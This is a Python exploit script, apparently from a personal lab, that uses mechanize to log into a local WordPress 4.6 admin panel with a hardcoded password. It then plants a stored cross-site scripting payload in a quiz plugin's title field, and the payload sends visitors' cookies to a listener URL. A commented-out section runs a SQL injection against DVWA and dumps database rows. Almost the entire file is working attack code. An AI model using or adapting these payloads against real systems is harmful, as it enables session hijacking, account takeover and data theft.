#!/usr/bin/python

#Bringing in mechanize and beautiful soup.  These are  installed separately from Python
import mechanize
from bs4 import BeautifulSoup

#Building the SQL injection
#hotSQLinjection = "' or ' 1 = 1"

#Creating a mechanize browser
browser = mechanize.Browser()
browser.set_handle_robots(False)

#Opening my URI to the DVWA web page obviously your location will most likely vary
browser.open("http://localhost:8888/WordPress-4.6/wp-admin/")

#Printing to browser title to show where I am

print "\n" + ("# " + browser.title() + "\n")

##There is only one form on this page so I jump right in
browser.select_form("loginform")

##Below I am filling out the form fields and submitting for log in
browser.form['log'] = 'admin'
browser.form['pwd'] = 'hgxSk#Fmexnu0^v!#B'
browser.submit()

#Again printing the browser title to show where I am

print ("# " + browser.title() + "\n")

browser.open("http://localhost:8888/WordPress-4.6/wp-admin/admin.php?page=quizlord")

print ("# " + browser.title() + "\n")


browser.form = list(browser.forms())[1]
#print (browser.form)

browser.form['title'] = '"><script language= "JavaScript">document.location="http://localhost:8888/cookielistener.php?cookie=" + document.cookie;document.location="http://localhost:8888/WordPress-4.6/wp-admin/admin.php?page=quizlord"</script>'
#for control in browser.form.controls:
#    print control

browser.submit()

browser.open("http://localhost:8888/WordPress-4.6/wp-admin/admin.php?page=quizlord")

print ("# " + browser.title() + "\n")

##print (browser.response().read())
#
#
##Now that I am authenticated I am opening the browser to the SQL Injection page
#browser.open("http://localhost:8888/dvwa/vulnerabilities/sqli")
#
##Again there is only one form so I am so I will jump right in
#
##Printing out what the SQLi is
#print ("\n")
#print ("#" *55)
#print ("# " + " The SQL Injection that will be used is: " + hotSQLinjection)
#print ("# " + " Injecting now")
#print ("#" *55)
#
##Inserting the SQL Injection into the form filed and submitting
#browser.addheaders = [('security' , 'low')]
#browser.select_form(nr=0)
#browser.form['id'] = hotSQLinjection
#browser.submit()
#
##This feeds the the browser page into a variable to feed into the BeautifulSoup parser
#page1 =  browser.response().read()
##print (page1)
#
##As it says!
#print ("\n")
#print ("#" *55)
#print ("# " + " Feeding page into BeautifulSoup LXML Parser")
#print ("#" *55)
#
#soup1 = BeautifulSoup(page1, "lxml")
#
##The "sensitive" info from the injection is surrounded by tags
##This creates a list to iterate though
#allPRE =  soup1.find_all('pre')
#
##Printing out the "sensitve" information from the DVWA database
#print ("\n")
#print ("#" *55)
#print ("# " + " Dump of database")
#print ("#" *55)
#
##Iterating through the list
#for pre in allPRE:
#    print (pre)
#
##All done
#print ("\n")
#print ("#" *55)
#print ("# " + " Injection and dump complete")
#print ("#" *55)
#print ("\n")